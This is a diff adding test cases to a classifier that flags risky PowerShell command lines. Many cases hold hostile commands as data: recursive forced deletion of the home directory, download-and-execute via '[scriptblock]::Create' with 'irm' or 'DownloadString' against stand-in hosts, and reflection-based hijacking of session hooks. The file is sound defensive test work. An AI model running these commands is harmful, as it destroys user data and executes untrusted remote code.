@@ -2,8 +2,12 @@
 # block or built from text: `Invoke-Command $b`, `[scriptblock]::Create(…)`,
 # `InvokeScript(…)`, `Start-Job`, a splat on a cmdlet that runs a block, a hook
 # the host runs, a method called by a name, `ExpandString`, `Where-Object` and
-# `Trace-Command`. A block written out is read where it stands, and text given
-# to build code is read too. The format is in CONTRIBUTING.md.
+# `Trace-Command`, a `[powershell]` instance, a member of the session reached
+# by a way the guard cannot name, a property, a script member, a `-replace`
+# replacement and a default parameter value that may be a block. A block
+# written out is read where it stands, and so is one a variable the line sets
+# for certain holds; text given to build code is read too. The format is in
+# CONTRIBUTING.md.
 
 # A block is read where it is written out, and unknown otherwise.
 powershell safe | Invoke-Command { Get-ChildItem }
@@ -399,3 +403,171 @@ powershell finds=unknown | Trace-Command ParameterBinding Get-Date
 powershell finds=unknown | Trace-Command -Name ParameterBinding -Command Get-Date
 powershell finds=unknown | Trace-Command -Name ParameterBinding -Expression { 1 } @p
 powershell finds=unknown | $b=[scriptblock]::Create('Remove-Item -Recurse -Force ~'); Trace-Command ParameterBinding $b
+
+
+# A `[powershell]` instance runs what `AddScript` and `AddCommand` gave it,
+# whichever method invokes it.
+powershell finds=unknown | [powershell]::Create().AddScript('Remove-Item -Recurse -Force ~').BeginInvoke()
+powershell finds=unknown | [powershell]::Create().AddScript('Remove-Item -Recurse -Force ~').Invoke()
+powershell finds=unknown | $ps = [powershell]::Create(); $ps.AddScript($c); $ps.BeginInvoke()
+powershell finds=unknown | $ps = [powershell]::Create(); $ps.AddCommand('Remove-Item'); $ps.InvokeAsync()
+powershell finds=unknown | $ps.InvokeAsync()
+
+# A member of the session named only when it runs, or reached through its
+# own view of its members, an item or a call, may be a hook or a method that
+# runs code.
+powershell finds=unknown | $m = 'InvokeScript'; $ExecutionContext.InvokeCommand.$m('Remove-Item -Recurse -Force ~')
+powershell finds=unknown | $ExecutionContext.InvokeCommand.('InvokeScript')('Remove-Item -Recurse -Force ~')
+powershell finds=unknown | $h = 'CommandNotFoundAction'; $ExecutionContext.InvokeCommand.$h = $b
+powershell finds=unknown | $ExecutionContext.InvokeCommand.psobject.Properties['CommandNotFoundAction'].Value = $b
+powershell finds=unknown | $ExecutionContext.SessionState.InvokeCommand.psobject.Properties.Item('CommandNotFoundAction').Value = $b
+powershell finds=unknown | $ExecutionContext.InvokeCommand.GetType().GetProperty('CommandNotFoundAction').SetValue($ExecutionContext.InvokeCommand, $b)
+powershell finds=unknown | $ic = $ExecutionContext.InvokeCommand; $ic.$h = $b
+powershell finds=unknown | $ec = $ExecutionContext; $ec.InvokeCommand.psobject.Properties['PreCommandLookupAction'].Value = $b
+powershell finds=unknown | ($ExecutionContext.InvokeCommand).$h = $b
+powershell safe | $ExecutionContext.SessionState.Path.CurrentLocation
+powershell safe | $ExecutionContext.InvokeCommand.GetCommand('git', 'Application').Source
+powershell safe | $row.$col = $v
+powershell safe | $row.psobject.Properties['Name'].Value = $v
+
+# `::Create` on a type only known when it runs may be `[scriptblock]`'s.
+powershell finds=unknown | $t=[scriptblock]; $t::Create('Remove-Item -Recurse -Force ~')
+powershell finds=unknown | $t::Create($c)
+powershell finds=delete,unknown | ([type]'scriptblock')::Create('Remove-Item -Recurse -Force ~')
+
+# Code built from a download runs what it downloads.
+powershell finds=run_downloaded | & ([scriptblock]::Create((iwr https://x)))
+powershell finds=run_downloaded | Invoke-Command -ScriptBlock ([scriptblock]::Create((irm https://x.example/a.ps1)))
+powershell finds=run_downloaded | [scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://x.example/a.ps1'))
+powershell finds=run_downloaded | $ExecutionContext.InvokeCommand.InvokeScript((irm https://x.example/a.ps1))
+
+# A variable the line sets once, at its top level, to a block written out is
+# that block where the line uses it after: the block is read where it is
+# written, as one that runs later. Set anywhere else, or again, or by a
+# command that may set it, it is only known when it runs.
+powershell safe | $sb = { Get-ChildItem }; Invoke-Command $sb
+powershell safe | $sb = { Get-ChildItem }; Invoke-Command -ScriptBlock $sb
+powershell safe | ${sb} = { Get-ChildItem }; Start-Job $sb
+powershell safe | $sb = { $_ -gt 1 }; 1..3 | Where-Object $sb
+powershell safe | $sb = { Get-Date }; Register-EngineEvent PowerShell.Exiting -Action $sb
+powershell safe | $sb = { Remove-Item -Recurse -Force .\\build }; cd ~
+powershell finds=delete | $sb = { Remove-Item -Recurse -Force ~ }; Invoke-Command $sb
+powershell finds=delete | $sb = { Remove-Item -Recurse -Force .\\build }; cd ~; Invoke-Command $sb
+powershell finds=delete | $sb = { Remove-Item -Recurse -Force $_ }; Get-ChildItem ~ | ForEach-Object $sb
+powershell finds=unknown | Invoke-Command $sb; $sb = { Get-ChildItem }
+powershell finds=unknown | if ($x) { $sb = { Get-ChildItem } }; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; $sb = $x; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; & { $sb = $x }; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; foreach ($sb in $list) { Invoke-Command $sb }
+powershell finds=unknown | $sb = { Get-ChildItem }; function f($sb) { Invoke-Command $sb }; f $x
+powershell finds=unknown | $sb = { Get-ChildItem }; Set-Variable sb $x; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; set sb $x; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; & 'Set-Variable' sb $x; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; Microsoft.PowerShell.Utility\\Set-Variable sb $x; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; (Get-Variable sb).Value = $x; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; Get-Content x -OutVariable sb; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; Get-Content x -ov sb; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; $global:sb = $x; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; Invoke-Command $global:sb
+powershell finds=unknown | $sb = { Get-ChildItem }; data sb { 'x' }; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; $r = [ref]$sb; $r.Value = $x; Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; $ExecutionContext.SessionState.PSVariable.Set('sb', $x); Invoke-Command $sb
+powershell finds=unknown | $sb = { Get-ChildItem }; Set-Alias x Set-Variable; Invoke-Command $sb
+powershell finds=unknown | $args = { Get-ChildItem }; Invoke-Command $args
+powershell finds=unknown | $sb = { Get-ChildItem }; & $sb
+
+# A block given to a cmdlet outside the table above, as a block parameter,
+# a property or a script member, is read the same way.
+powershell safe | Register-ArgumentCompleter -CommandName git -ScriptBlock { param($a) }
+powershell safe | Set-PSReadLineKeyHandler -Key Ctrl+x -Function Undo
+powershell safe | Set-PSReadLineKeyHandler Ctrl+x { 1 }
+powershell safe | Use-Transaction { 1 }
+powershell finds=unknown | Register-ArgumentCompleter -CommandName git -ScriptBlock $b
+powershell finds=unknown | Set-PSReadLineKeyHandler -Key Enter -ScriptBlock $b
+powershell finds=unknown | Set-PSReadLineKeyHandler Ctrl+x $b
+powershell finds=unknown | Use-Transaction -TransactedScript $b
+powershell finds=unknown | Use-Transaction $b
+powershell finds=unknown | Trace-Command -Name x -Expression $b
+powershell finds=unknown | Get-ChildItem | Where-Object $b
+
+# A property may be a block, or a table that holds one: a name or a block
+# written out is read, any other value is unknown.
+powershell safe | Get-ChildItem | Sort-Object Length
+powershell safe | Get-ChildItem | Sort-Object Length -Descending
+powershell safe | Get-ChildItem | Select-Object Name, Length
+powershell safe | Get-ChildItem | Select-Object -First 5 -ExpandProperty Name
+powershell safe | Get-ChildItem | Sort-Object -Property @{Expression={$_.Length}; Descending=$true}
+powershell safe | Get-ChildItem | Select-Object Name, @{n='Size';e={$_.Length}}
+powershell safe | Get-ChildItem | Format-Table Name, @{Label='Size'; Expression={$_.Length}}
+powershell safe | Get-ChildItem | Group-Object { $_.Extension }
+powershell safe | Get-ChildItem | Measure-Object -Property Length -Sum
+powershell safe | $p = 'Name', 'Length'; Get-ChildItem | Select-Object $p
+powershell finds=unknown | Get-ChildItem | Sort-Object $b
+powershell finds=unknown | Get-ChildItem | Sort-Object -Property $p
+powershell finds=unknown | Get-ChildItem | sort $b
+powershell finds=unknown | Get-ChildItem | Select-Object @{n='x';e=$b}
+powershell finds=unknown | Get-ChildItem | Select-Object -Property Name, @{n='x';e=$b}
+powershell finds=unknown | Get-ChildItem | Group-Object $b
+powershell finds=unknown | Get-ChildItem | Format-Table @{e=$b}
+powershell finds=unknown | Get-ChildItem | Format-List -GroupBy $b
+powershell finds=unknown | Get-ChildItem | Measure-Object -Property (Get-Prop)
+powershell finds=unknown | Get-ChildItem | Sort-Object @p
+powershell safe | $lines | % Split $sep
+
+# A script member runs its value as a block whenever it is used.
+powershell safe | $o | Add-Member -MemberType NoteProperty -Name X -Value $x
+powershell safe | $o | Add-Member -NotePropertyName X -NotePropertyValue $x
+powershell safe | $o | Add-Member NoteProperty X $x
+powershell safe | $o | Add-Member ScriptMethod X { 1 }
+powershell safe | Add-Member -InputObject $o -MemberType ScriptProperty -Name X -Value { 1 } -SecondValue { 2 }
+powershell safe | Update-TypeData -TypeName System.String -MemberType ScriptProperty -MemberName X -Value { 1 }
+powershell safe | Update-TypeData -TypeName X -MemberType NoteProperty -MemberName Y -Value $v
+powershell finds=unknown | Add-Member -InputObject $o -MemberType ScriptMethod -Name X -Value $b; $o.X()
+powershell finds=unknown | $o | Add-Member ScriptMethod X $b
+powershell finds=unknown | $o | Add-Member -MemberType ScriptProperty -Name X -Value { 1 } -SecondValue $b
+powershell finds=unknown | $o | Add-Member -MemberType $t -Name X -Value $x
+powershell finds=unknown | $o | Add-Member @p
+powershell finds=unknown | Update-TypeData -TypeName System.String -MemberType ScriptMethod -MemberName X -Value $b
+powershell finds=unknown | Update-TypeData -TypeData $td
+
+# A replacement may be a block, run for each match.
+powershell safe | 'a' -replace 'a', 'b'
+powershell safe | 'a' -replace 'a'
+powershell safe | 'a' -replace 'a', { $_.Value.ToUpper() }
+powershell safe | $new = 'b'; (Get-Content f) -replace 'a', $new
+powershell safe | Write-Output ('a' -replace 'a', 'b')
+powershell finds=unknown | 'a' -replace 'a', $b
+powershell finds=unknown | 'a' -creplace 'a', $b
+powershell finds=unknown | 'a' -ireplace 'a', $b
+powershell finds=unknown | 'a' -replace $pair
+powershell finds=unknown | (Get-Content f) -replace $old, $new
+powershell finds=unknown | Write-Output ('a' -replace 'a', $b)
+
+# `.Where` and `.ForEach` run a block on each item.
+powershell safe | $list.Where({ $_ -gt 1 })
+powershell finds=unknown | $list.Where($b)
+
+# A default value of a parameter is given to the command where it runs: one
+# that may be a block only known when it runs is unknown, and a block written
+# out runs where the command does.
+powershell safe | $PSDefaultParameterValues['*:Encoding'] = 'utf8'
+powershell safe | $PSDefaultParameterValues = @{ '*:Encoding' = 'utf8'; 'Get-ChildItem:Force' = $true }
+powershell safe | $PSDefaultParameterValues.Add('*:Encoding', 'utf8')
+powershell finds=unknown | $PSDefaultParameterValues['Invoke-Command:ScriptBlock'] = $b; Invoke-Command
+powershell finds=unknown | $PSDefaultParameterValues = @{ 'Invoke-Command:ScriptBlock' = $b }
+powershell finds=unknown | $PSDefaultParameterValues.Add('Invoke-Command:ScriptBlock', $b)
+powershell finds=unknown | $global:PSDefaultParameterValues['Invoke-Command:ScriptBlock'] = $b
+powershell finds=unknown | ($PSDefaultParameterValues)['Invoke-Command:ScriptBlock'] = $b
+powershell finds=delete | $PSDefaultParameterValues['Invoke-Command:ScriptBlock'] = { Remove-Item -Recurse -Force .\\build }; cd ~; Invoke-Command
+
+# A script file only known when it runs is unknown.
+powershell safe | Start-Job -FilePath .\\job.ps1
+powershell finds=unknown | Start-Job -FilePath $f
+powershell finds=unknown | Invoke-Command -FilePath $f -ComputerName srv
+powershell finds=unknown | Register-ScheduledJob -Name x -FilePath $f
+
+# A number's letters are read in any case.
+powershell safe | Get-ChildItem | Where-Object { $_.Length -gt 1MB }
+powershell safe | Get-ChildItem | Where-Object { $_.Length -gt 1kb }
+powershell safe | Get-ChildItem | Where-Object { $_.Length -gt 1MB -and $_.Length -lt 1.5GB }
+powershell safe | Get-ChildItem | Where-Object { $_.Length -gt 0X10KB }
